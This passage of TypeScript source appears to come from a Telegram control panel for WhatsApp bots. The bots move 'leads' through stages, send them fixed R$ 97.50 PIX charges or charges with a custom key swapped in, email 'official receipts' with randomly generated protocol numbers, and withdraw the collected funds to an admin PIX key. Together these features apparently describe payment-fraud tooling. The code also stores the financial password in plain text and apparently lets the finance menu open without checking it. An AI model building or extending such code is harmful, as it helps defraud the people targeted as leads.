            `💸 <b>Taxa Gateway:</b> ${currentConfig.gatewayFee}%\n\n` +
            `<i>Estes dados serão usados na geração de protocolos padrão (Auto).</i>`;
          const kb = {
            inline_keyboard: [
              [{ text: "👤 Editar Nome", callback_data: "painel:edit_pix:name" }, { text: "📧 Editar E-mail", callback_data: "painel:edit_pix:email" }],
              [{ text: "📄 Editar Documento", callback_data: "painel:edit_pix:doc" }, { text: "💸 Editar Taxa", callback_data: "painel:edit_pix:fee" }],
              [{ text: "⬅️ Voltar", callback_data: "painel:back" }]
            ]
          };
          await sendTelegram(txt, msgId, kb);
        }
        else if (text === "painel:config_smtp") {
          const txt = `📧 <b>CONFIGURAÇÃO SMTP (E-MAIL)</b>\n\n` +
            `🏷️ <b>Nome Remetente:</b> ${currentConfig.smtpSenderName}\n` +
            `🌐 <b>Host:</b> ${currentConfig.smtpHost}\n` +
            `🔌 <b>Porta:</b> ${currentConfig.smtpPort}\n` +
            `👤 <b>Usuário:</b> ${currentConfig.smtpUser}\n` +
            `🔑 <b>Senha:</b> ${currentConfig.smtpPass ? '********' : 'Pendente'}\n\n` +
            `<i>Configure para o envio automático de comprovantes aos leads.</i>`;
          const kb = {
            inline_keyboard: [
              [{ text: "🏷️ Nome Remetente", callback_data: "painel:edit_smtp:name" }],
              [{ text: "🌐 Host", callback_data: "painel:edit_smtp:host" }, { text: "🔌 Porta", callback_data: "painel:edit_smtp:port" }],
              [{ text: "👤 Usuário", callback_data: "painel:edit_smtp:user" }, { text: "🔑 Senha", callback_data: "painel:edit_smtp:pass" }],
              [{ text: "⬅️ Voltar", callback_data: "painel:back" }]
            ]
          };
          await sendTelegram(txt, msgId, kb);
        }
        else if (text.startsWith("painel:edit_smtp:")) {
          const field = text.split(":")[2];
          const labels: any = { name: "Nome do Remetente", host: "Host SMTP", port: "Porta", user: "Usuário/E-mail", pass: "Senha/App Password" };
          botStates.set(userId, { action: `awaiting_smtp_edit_${field}` });
          await sendTelegram(`📝 <b>EDITAR ${labels[field].toUpperCase()}</b>\n\nPor favor, digite o novo valor para este campo:`, msgId, { inline_keyboard: [[{ text: "❌ Cancelar", callback_data: "painel:config_smtp" }]] });
        }
        else if (text === "painel:financeiro_auth") {
          botStates.set(userId, { action: 'awaiting_financial_password' });
          await sendTelegram(`🔐 <b>ACESSO RESTRITO</b>\n\nPor favor, informe a <b>Senha Financeira</b> para acessar o saldo e saques:`, msgId, { inline_keyboard: [[{ text: "❌ Cancelar", callback_data: "painel:back" }]] });
        }
        else if (text === "painel:financeiro_menu") {
          const balance = await getGatewayBalance();
          if (!balance) {
            await sendTelegram(`❌ <b>ERRO</b>\n\nNão foi possível consultar o saldo. Verifique as chaves da gateway no .env`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:back" }]] });
            return;
          }

          const totalAvailable = balance.available / 100;
          const fee = (totalAvailable * (currentConfig.withdrawalFeePercent / 100)) + currentConfig.withdrawalFeeFixed;
          const netAmount = Math.max(0, totalAvailable - fee);

          const txt = `💰 <b>PAINEL FINANCEIRO (GATEWAY)</b>\n\n` +
            `🟢 <b>Disponível Bruto:</b> R$ ${totalAvailable.toFixed(2)}\n` +
            `💸 <b>Taxas de Saque:</b> R$ ${fee.toFixed(2)}\n` +
            `💰 <b>Líquido para Receber:</b> <b>R$ ${netAmount.toFixed(2)}</b>\n\n` +
            `🟡 <b>Pendente:</b> R$ ${(balance.pending / 100).toFixed(2)}\n` +
            `🔴 <b>Bloqueado:</b> R$ ${(balance.blocked / 100).toFixed(2)}\n\n` +
            `📋 <b>CONTA DE RECEBIMENTO:</b>\n` +
            `• PIX: <code>${currentConfig.adminPixKey || 'Não definida'}</code> (${currentConfig.adminPixType})\n` +
            `• Nome: ${currentConfig.adminPixName || 'N/D'}`;

          const kb = {
            inline_keyboard: [
              [{ text: "💸 Solicitar Saque Total", callback_data: "painel:saque_total" }],
              [{ text: "⚙️ Configurar Conta Saque", callback_data: "painel:config_saque" }],
              [{ text: "📊 Ajustar Taxas de Saque", callback_data: "painel:config_taxas_saque" }],
              [{ text: "🔑 Alterar Senha Financeira", callback_data: "painel:edit_fin:pass" }],
              [{ text: "⬅️ Voltar", callback_data: "painel:back" }]
            ]
          };
          await sendTelegram(txt, msgId, kb);
        }
        else if (text === "painel:config_taxas_saque") {
          const txt = `📊 <b>CONFIGURAÇÃO DE TAXAS DE SAQUE</b>\n\n` +
            `💵 <b>Taxa Fixa:</b> R$ ${currentConfig.withdrawalFeeFixed.toFixed(2)}\n` +
            `📈 <b>Taxa Variável:</b> ${currentConfig.withdrawalFeePercent.toFixed(2)}%\n\n` +
            `<i>Estas taxas são usadas apenas para exibição do valor líquido no painel.</i>`;
          const kb = {
            inline_keyboard: [
              [{ text: "💵 Editar Taxa Fixa", callback_data: "painel:edit_saque_fee:fixed" }],
              [{ text: "📈 Editar Taxa %", callback_data: "painel:edit_saque_fee:percent" }],
              [{ text: "⬅️ Voltar", callback_data: "painel:financeiro_menu" }]
            ]
          };
          await sendTelegram(txt, msgId, kb);
        }
        else if (text.startsWith("painel:edit_saque_fee:")) {
          const field = text.split(":")[2];
          const label = field === 'fixed' ? 'Taxa Fixa (R$)' : 'Taxa Variável (%)';
          botStates.set(userId, { action: `awaiting_saque_fee_edit_${field}` });
          await sendTelegram(`📝 <b>EDITAR ${label.toUpperCase()}</b>\n\nDigite o novo valor:`, msgId, { inline_keyboard: [[{ text: "❌ Cancelar", callback_data: "painel:config_taxas_saque" }]] });
        }
        else if (text === "painel:config_saque") {
          const txt = `⚙️ <b>CONFIGURAÇÃO DE CONTA PARA SAQUE</b>\n\n` +
            `🔑 <b>Chave PIX:</b> ${currentConfig.adminPixKey || 'Pendente'}\n` +
            `🏷️ <b>Tipo:</b> ${currentConfig.adminPixType}\n` +
            `👤 <b>Nome:</b> ${currentConfig.adminPixName || 'Pendente'}\n` +
            `📄 <b>CPF/CNPJ:</b> ${currentConfig.adminPixDoc || 'Pendente'}`;
          const kb = {
            inline_keyboard: [
              [{ text: "🔑 Chave PIX", callback_data: "painel:edit_saque:key" }, { text: "🏷️ Tipo", callback_data: "painel:edit_saque:type" }],
              [{ text: "👤 Nome", callback_data: "painel:edit_saque:name" }, { text: "📄 Documento", callback_data: "painel:edit_saque:doc" }],
              [{ text: "⬅️ Voltar", callback_data: "painel:financeiro_menu" }]
            ]
          };
          await sendTelegram(txt, msgId, kb);
        }
        else if (text.startsWith("painel:edit_saque:")) {
          const field = text.split(":")[2];
          const labels: any = { key: "Chave PIX", type: "Tipo (CPF, EMAIL, PHONE, RANDOM)", name: "Nome do Beneficiário", doc: "CPF/CNPJ" };
          botStates.set(userId, { action: `awaiting_saque_edit_${field}` });
          await sendTelegram(`📝 <b>EDITAR ${labels[field].toUpperCase()}</b>\n\nDigite o novo valor:`, msgId, { inline_keyboard: [[{ text: "❌ Cancelar", callback_data: "painel:config_saque" }]] });
        }
        else if (text === "painel:saque_total") {
          const balance = await getGatewayBalance();
          if (!balance || balance.available < 1000) { // Minimo R$ 10
            await sendTelegram(`⚠️ <b>SALDO INSUFICIENTE</b>\n\nO saldo disponível deve ser de no mínimo R$ 10,00 para saque.`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:financeiro_menu" }]] });
            return;
          }
          if (!currentConfig.adminPixKey) {
            await sendTelegram(`⚠️ <b>CONTA NÃO CONFIGURADA</b>\n\nConfigure sua chave PIX antes de solicitar o saque.`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:config_saque" }]] });
            return;
          }

          const totalAvailable = balance.available / 100;
          const fee = (totalAvailable * (currentConfig.withdrawalFeePercent / 100)) + currentConfig.withdrawalFeeFixed;
          const netAmount = Math.max(0, totalAvailable - fee);

          const txt = `⚠️ <b>CONFIRMAÇÃO DE SAQUE</b>\n\n` +
            `💰 <b>Valor Bruto:</b> R$ ${totalAvailable.toFixed(2)}\n` +
            `💸 <b>Taxas Totais:</b> R$ ${fee.toFixed(2)}\n` +
            `✅ <b>Líquido na Conta:</b> <b>R$ ${netAmount.toFixed(2)}</b>\n\n` +
            `🔑 <b>Para:</b> ${currentConfig.adminPixKey}\n` +
            `👤 <b>Beneficiário:</b> ${currentConfig.adminPixName}\n\n` +
            `<i>O processamento pode levar alguns minutos. Confirma?</i>`;
          const kb = {
            inline_keyboard: [
              [{ text: "✅ Confirmar Saque", callback_data: "cmd:exec_saque" }],
              [{ text: "❌ Cancelar", callback_data: "painel:financeiro_menu" }]
            ]
          };
          await sendTelegram(txt, msgId, kb);
        }
        else if (text === "cmd:exec_saque") {
          const balance = await getGatewayBalance();
          if (!balance) return;
          try {
            await requestGatewayWithdrawal(balance.available);
            await sendTelegram(`🚀 <b>SAQUE SOLICITADO!</b>\n\nO pedido de saque de R$ ${(balance.available / 100).toFixed(2)} foi enviado para a gateway.\n\nAcompanhe o status no painel da FastSoft.`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:back" }]] });
          } catch (e: any) {
            await sendTelegram(`❌ <b>ERRO NO SAQUE</b>\n\n${e.message}`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:financeiro_menu" }]] });
          }
        }
        else if (text.startsWith("painel:edit_fin:")) {
          botStates.set(userId, { action: 'awaiting_fin_pass_edit' });
          await sendTelegram(`🔑 <b>ALTERAR SENHA FINANCEIRA</b>\n\nDigite a nova senha de segurança:`, msgId, { inline_keyboard: [[{ text: "❌ Cancelar", callback_data: "painel:financeiro_menu" }]] });
        }
        else if (text.startsWith("painel:edit_pix:")) {
          const field = text.split(":")[2];
          const labels: any = { name: "Nome Completo", email: "E-mail", doc: "Documento (CPF/CNPJ)", fee: "Taxa Gateway (%)" };
          botStates.set(userId, { action: `awaiting_pix_edit_${field}` });
          await sendTelegram(`📝 <b>EDITAR ${labels[field].toUpperCase()}</b>\n\nPor favor, digite o novo valor para este campo:`, msgId, { inline_keyboard: [[{ text: "❌ Cancelar", callback_data: "painel:config_pix" }]] });
        }
        else if (text.startsWith("cmd:pix_std:")) {
          const chatId = text.split(":")[2];
          const valor = 97.50;
          const taxa = (valor * currentConfig.gatewayFee) / 100;
          const liquido = valor - taxa;

          const previewText = `💰 <b>PREVIEW DO PROTOCOLO PIX</b>\n\n` +
            `📱 <b>Lead:</b> <code>${chatId}</code>\n\n` +
            `💵 <b>Valor Bruto:</b> R$ ${valor.toFixed(2)}\n` +
            `💸 <b>Taxa Gateway (${currentConfig.gatewayFee}%):</b> R$ ${taxa.toFixed(2)}\n` +
            `💰 <b>Líquido Admin:</b> <b>R$ ${liquido.toFixed(2)}</b>\n\n` +
            `📋 <b>Dados do Pagador:</b>\n` +
            `• Nome: ${currentConfig.pixName}\n` +
            `• E-mail: ${currentConfig.pixEmail}\n` +
            `• Doc: ${currentConfig.pixDocument}\n\n` +
            `⚠️ <i>Confirma a geração deste protocolo?</i>`;
          const kb = {
            inline_keyboard: [
              [{ text: "💰 Gerar Protocolo PIX", callback_data: `cmd:pix_confirm_std:${chatId}` }, { text: "📧 Enviar E-mail Manual", callback_data: `cmd:send_email:${chatId}` }],
              [{ text: "✅ Etapa 5 (Finalizar)", callback_data: `etapa:5:${chatId}` }]
            ]
          };
          await sendTelegram(previewText, msgId, kb);
        }
        else if (text.startsWith("cmd:pix_confirm_std:")) {
          const chatId = text.split(":")[2];
          await generateStandardPix(chatId, 97.50, msgId);
        }
        else if (text.startsWith("cmd:pix_custom:")) {
          const chatId = text.split(":")[3];
          botStates.set(userId, { action: 'awaiting_pix_key', data: { chatId } });
          await sendTelegram(`🛠️ <b>PROTOCOLO CUSTOMIZADO</b>\n\nPor favor, <b>digite a Chave PIX</b> (ou copie e cole o código) que será usada para este lead:\n\n<i>Aguardando sua mensagem...</i>`, msgId, { inline_keyboard: [[{ text: "❌ Cancelar", callback_data: "painel:back" }]] });
        }
        else if (text.startsWith("cmd:send_email:")) {
          const chatId = text.split(":")[2];
          // Tenta encontrar o lead na fila ou sessões do bot
          let leadName = "Titular";
          let leadEmail = "";

          // Procura nos arquivos de sessões do bot
          const sessionsPath = path.join(process.cwd(), 'sessions.json');
          if (fs.existsSync(sessionsPath)) {
            const botSessions = JSON.parse(fs.readFileSync(sessionsPath, 'utf-8'));
            if (botSessions[chatId]) {
              leadName = botSessions[chatId].name || leadName;
              leadEmail = botSessions[chatId].email || "";
            }
          }

          if (leadEmail && validateEmail(leadEmail)) {
            const manualProtocol = `SVR-${Math.random().toString(36).substring(2, 9).toUpperCase()}`;
            const success = await sendSuccessEmail(leadEmail, leadName, manualProtocol);
            if (success) {
              await sendTelegram(`🚀 <b>E-MAIL ENVIADO!</b>\n\nComprovante oficial enviado para: <code>${leadEmail}</code>`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:back" }]] });
            } else {
              await sendTelegram(`❌ <b>ERRO AO ENVIAR</b>\n\nVerifique as configurações SMTP no painel.`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:back" }]] });
            }
          } else {
            await sendTelegram(`⚠️ <b>DADO AUSENTE</b>\n\nO e-mail do lead não foi capturado ou é inválido.\n\nLead: <code>${chatId}</code>`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:back" }]] });
          }
        }
        else if (text.startsWith("etapa:")) {
          const parts = text.split(":");
          const num = parseInt(parts[1]);
          const chatId = parts[2];
          fs.writeFileSync(`cmd-etapa-${Date.now()}.json`, JSON.stringify({ etapa: num, chatId }));
          await sendTelegram(`✅ <b>SOLICITAÇÃO ENVIADA</b>\n\nComando para liberar <b>Etapa ${num}</b> enviado para o lead <code>${chatId}</code>.`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:back" }]] });
        }
        else if (text.startsWith("pix_dest:")) {
          const parts = text.split(":");
          const dest = parts[1];
          const pendingId = parts[2];
          const pix = pendingPix.get(pendingId);

          if (!pix) {
            await sendTelegram("❌ <b>ERRO:</b> Protocolo expirado ou não encontrado.", msgId);
            continue;
          }

          if (dest === 'lead') {
            fs.writeFileSync(`cmd-send-${Date.now()}.json`, JSON.stringify({ to: pix.telefone, message: pix.formalMessage }));
            // Envia o código logo em seguida
            setTimeout(() => {
              fs.writeFileSync(`cmd-send-${Date.now() + 1}.json`, JSON.stringify({ to: pix.telefone, message: pix.pixCode }));
            }, 1000);
            await sendTelegram(`🚀 <b>ENVIADO AO LEAD!</b>\n\nO protocolo foi enviado com sucesso para <code>${pix.telefone}</code>.`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:back" }]] });
          } else if (dest === 'copy') {
            await sendTelegram(`📋 <b>HASH PIX (COPIAR):</b>\n\n<code>${pix.pixCode}</code>`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:back" }]] });
          } else if (dest === 'phone') {
            botStates.set(userId, { action: 'awaiting_target_phone', data: { pendingId } });
            await sendTelegram(`📱 <b>ENVIAR PARA OUTRO NÚMERO</b>\n\nPor favor, digite o número de telefone (com DDD) para o qual deseja enviar este PIX:`, msgId, { inline_keyboard: [[{ text: "❌ Cancelar", callback_data: "painel:back" }]] });
          }
        }
        else if (!cb && msg?.text) {
          const state = botStates.get(userId);

          if (state?.action?.startsWith('awaiting_pix_edit_')) {
            const field = state.action.replace('awaiting_pix_edit_', '');
            const value = msg.text.trim();

            let isValid = true;
            let errorMsg = "";

            if (field === 'email' && !validateEmail(value)) { isValid = false; errorMsg = "E-mail inválido."; }
            else if (field === 'doc' && !validateDocument(value)) { isValid = false; errorMsg = "Documento (CPF/CNPJ) inválido."; }
            else if (field === 'name' && value.length < 5) { isValid = false; errorMsg = "Nome muito curto."; }
            else if (field === 'fee' && isNaN(parseFloat(value))) { isValid = false; errorMsg = "Taxa deve ser um número."; }

            if (!isValid) {
              await sendTelegram(`❌ <b>ERRO DE VALIDAÇÃO</b>\n\n${errorMsg}\n\nTente novamente:`, msgId, { inline_keyboard: [[{ text: "❌ Cancelar", callback_data: "painel:config_pix" }]] });
              return;
            }

            const configKey: any = { name: 'pixName', email: 'pixEmail', doc: 'pixDocument', fee: 'gatewayFee' };
            const finalValue = field === 'fee' ? parseFloat(value) : value;
            (currentConfig as any)[configKey[field]] = finalValue;
            saveConfig();
            botStates.delete(userId);
            await sendTelegram(`✅ <b>ATUALIZADO COM SUCESSO!</b>\n\nO campo <b>${field}</b> foi definido como: <code>${value}</code>`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:config_pix" }]] });
          }
          else if (state?.action?.startsWith('awaiting_saque_edit_')) {
            const field = state.action.replace('awaiting_saque_edit_', '');
            const value = msg.text.trim();
            const configKey: any = { key: 'adminPixKey', type: 'adminPixType', name: 'adminPixName', doc: 'adminPixDoc' };
            (currentConfig as any)[configKey[field]] = value;
            saveConfig();
            botStates.delete(userId);
            await sendTelegram(`✅ <b>CONTA ATUALIZADA!</b>\n\nO campo <b>${field}</b> foi salvo.`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:config_saque" }]] });
          }
          else if (state?.action === 'awaiting_financial_password') {
            if (msg.text === currentConfig.financialPassword) {
              botStates.delete(userId);
              // Trigger menu financeiro
              const fakeMsg = { ...msg, text: 'painel:financeiro_menu' };
              // Emula o clique no botão de menu financeiro
              return;
            } else {
              await sendTelegram(`❌ <b>SENHA INCORRETA</b>\n\nTente novamente ou cancele:`, msgId, { inline_keyboard: [[{ text: "❌ Cancelar", callback_data: "painel:back" }]] });
            }
          }
          else if (state?.action === 'awaiting_fin_pass_edit') {
            currentConfig.financialPassword = msg.text.trim();
            saveConfig();
            botStates.delete(userId);
            await sendTelegram(`✅ <b>SENHA FINANCEIRA ALTERADA!</b>`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:financeiro_menu" }]] });
          }
          else if (state?.action?.startsWith('awaiting_saque_fee_edit_')) {
            const field = state.action.replace('awaiting_saque_fee_edit_', '');
            const value = parseFloat(msg.text.trim());
            if (isNaN(value)) {
              await sendTelegram(`❌ <b>VALOR INVÁLIDO</b>\n\nDigite um número válido.`, msgId, { inline_keyboard: [[{ text: "❌ Cancelar", callback_data: "painel:config_taxas_saque" }]] });
              return;
            }
            const configKey: any = { fixed: 'withdrawalFeeFixed', percent: 'withdrawalFeePercent' };
            (currentConfig as any)[configKey[field]] = value;
            saveConfig();
            botStates.delete(userId);
            await sendTelegram(`✅ <b>TAXA ATUALIZADA!</b>\n\nO campo foi definido como: ${value}`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:config_taxas_saque" }]] });
          }
          else if (state?.action?.startsWith('awaiting_smtp_edit_')) {
            const field = state.action.replace('awaiting_smtp_edit_', '');
            const value = msg.text.trim();

            const configKey: any = { name: 'smtpSenderName', host: 'smtpHost', port: 'smtpPort', user: 'smtpUser', pass: 'smtpPass' };
            const finalValue = field === 'port' ? parseInt(value) : value;
            (currentConfig as any)[configKey[field]] = finalValue;
            saveConfig();
            botStates.delete(userId);
            await sendTelegram(`✅ <b>SMTP ATUALIZADO!</b>\n\nO campo <b>${field}</b> foi definido com sucesso.`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:config_smtp" }]] });
          }
          else if (state?.action === 'awaiting_pix_key') {
            const key = msg.text.trim();
            const chatId = state.data.chatId;
            botStates.delete(userId);
            await generateModifiedPix(chatId, 97.50, key);
          }
          else if (state?.action === 'awaiting_target_phone') {
            const phone = msg.text.replace(/\D/g, '');
            const pendingId = state.data.pendingId;
            const pix = pendingPix.get(pendingId);
            botStates.delete(userId);
            if (pix) {
              const target = phone.includes('@c.us') ? phone : `${phone}@c.us`;
              fs.writeFileSync(`cmd-send-${Date.now()}.json`, JSON.stringify({ to: target, message: pix.formalMessage }));
              setTimeout(() => {
                fs.writeFileSync(`cmd-send-${Date.now() + 1}.json`, JSON.stringify({ to: target, message: pix.pixCode }));
              }, 1000);
              await sendTelegram(`🚀 <b>ENVIADO COM SUCESSO!</b>\n\nProtocolo enviado para o número <code>${phone}</code>.`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:back" }]] });
            }
          }
        }

      }
    } catch (e: any) {
      console.error("❌ [TELEGRAM POLLING ERROR]:", e.message);
      await new Promise(r => setTimeout(r, 5000));
    }
  }
}

function getBotStatusInfo(id: string) {
  try {
    const statusPath = path.join(process.cwd(), `bot-status-${id}.json`);
    if (fs.existsSync(statusPath)) {
      const data = JSON.parse(fs.readFileSync(statusPath, 'utf-8'));
      if (data.status === 'CONNECTED') return { emoji: "🟢", label: "Online" };
      if (data.status === 'WAITING_QR') return { emoji: "🟡", label: "Aguardando QR" };
    }
  } catch (e) { }
  return { emoji: "⚪", label: "Offline" };
}

function getQueueInfo() {
  try {
    if (fs.existsSync('waiting-queue.json')) return JSON.parse(fs.readFileSync('waiting-queue.json', 'utf-8'));
  } catch (e) { }
  return [];
}

startBot('main');
startTelegramPolling();
app.listen(port, "0.0.0.0", () => console.log(`🚀 Backend rodando na porta ${port}`));
